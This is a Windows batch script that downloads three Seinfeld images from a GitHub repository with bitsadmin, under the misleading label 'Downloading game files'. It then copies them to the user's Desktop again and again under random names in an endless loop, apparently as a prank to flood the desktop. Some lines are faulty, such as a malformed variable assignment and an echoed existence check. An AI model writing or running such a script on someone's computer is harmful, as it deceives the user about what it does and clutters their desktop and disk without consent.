@echo off
Set %loop%=0
cd %UserProfile%\Documents
mkdir Seinfeld
bitsadmin.exe /transfer "Downloading game files" https://raw.githubusercontent.com/Boernthebred/TextGame/master/Files/Seinfeld.jpg %UserProfile%\Documents\seinfeld\seinfield.jpg
bitsadmin.exe /transfer "Downloading game files" https://raw.githubusercontent.com/Boernthebred/TextGame/master/Files/Seinfeld2.jpg %UserProfile%\Documents\seinfeld\seinfield2.jpg
bitsadmin.exe /transfer "Downloading game files" https://raw.githubusercontent.com/Boernthebred/TextGame/master/Files/Seinfeld3.jpg %UserProfile%\Documents\seinfeld\seinfield3.jpg
:start
cd %UserProfile%\Desktop
copy "%UserProfile%\Documents\seinfeld\"
cd "%UserProfile%\Documents\seinfeld\"
setlocal disableDelayedExpansion
set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
for /f "eol=: delims=" %%F in ('dir /b /a-d *.jpg') do call :renameFile "%%F"
exit /b
:renameFile
setlocal enableDelayedExpansion
:retry
set "name="
for /l %%N in (1 1 8) do (
  set /a I=!random!%%36
  for %%I in (!I!) do set "name=!name!!chars:~%%I,1!"
)
echo if exist !name!.jpg goto :retry
endlocal & ren %1 %name%.jpg
set /a loop=%loop%+1
GOTO start

:next
exit